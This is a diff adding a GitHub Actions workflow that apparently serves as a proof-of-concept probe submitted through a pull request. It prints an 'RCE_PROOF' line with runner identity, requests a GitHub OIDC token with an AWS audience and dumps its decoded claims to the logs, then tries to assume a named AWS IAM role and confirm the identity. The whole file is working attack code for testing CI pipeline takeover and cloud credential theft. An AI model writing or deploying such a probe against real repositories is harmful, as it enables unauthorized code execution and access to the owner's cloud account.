@@ -1,0 +1,29 @@
+name: probe
+on: pull_request
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  p:
+    runs-on: ubuntu-latest
+    steps:
+      - name: runner-proof
+        run: |
+          echo "RCE_PROOF host=$(hostname) user=$(id -un) uid=$(id -u)"
+          echo "event=$GITHUB_EVENT_NAME repo=$GITHUB_REPOSITORY ref=$GITHUB_REF actor=$GITHUB_ACTOR"
+      - name: oidc-claims
+        run: |
+          TOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
+          echo "oidc_token_len=${#TOKEN}"
+          echo "$TOKEN" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | head -c 900; echo
+      - name: assume-role-check
+        id: creds
+        continue-on-error: true
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::472386928882:role/github-actions-role
+          aws-region: us-west-2
+      - name: identity
+        continue-on-error: true
+        run: |
+          aws sts get-caller-identity || echo "assume-role not permitted"
